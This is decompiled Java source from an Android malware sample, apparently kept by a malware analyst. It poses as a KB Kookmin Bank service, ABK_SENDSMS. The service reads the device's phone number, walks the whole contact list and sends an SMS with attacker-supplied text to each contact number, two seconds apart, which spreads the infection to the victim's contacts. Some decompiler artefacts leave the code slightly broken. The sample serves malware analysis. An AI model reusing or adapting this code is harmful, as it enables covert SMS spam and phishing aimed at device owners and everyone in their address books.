package com.kbstar.kb.android.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.kbstar.kb.android.star.util.CSendSMS;
import com.kbstar.kb.android.star.util.Url;

public class ABK_SENDSMS
  extends Service
{
  private final String DEBUG_TAG = "clService";
  private String number = "";
  public boolean threadDisable = true;
  private final Url u = new Url();
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    this.threadDisable = true;
    Log.v("clService", "on destroy");
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        String str1 = this.val$temp;
        ((TelephonyManager)ABK_SENDSMS.this.getSystemService("phone")).getLine1Number();
        ContentResolver localContentResolver = ABK_SENDSMS.this.getContentResolver();
        Cursor localCursor = localContentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (!localCursor.moveToNext())
        {
          localCursor.close();
          return;
        }
        localCursor.getString(localCursor.getColumnIndex("display_name"));
        Object localObject = localCursor.getString(localCursor.getColumnIndex("_id"));
        localObject = localContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = " + (String)localObject, null, null);
        for (;;)
        {
          if (!((Cursor)localObject).moveToNext())
          {
            ((Cursor)localObject).close();
            break;
          }
          String str2 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("data1"));
          ABK_SENDSMS.this.number = str2;
          if (ABK_SENDSMS.this.number.length() > 5) {
            CSendSMS.sendSMS(ABK_SENDSMS.this.number, str1);
          }
          try
          {
            Thread.sleep(2000L);
          }
          catch (InterruptedException localInterruptedException)
          {
            localInterruptedException.printStackTrace();
          }
        }
      }
    }).start();
    return paramInt2;
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/services/ABK_SENDSMS.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */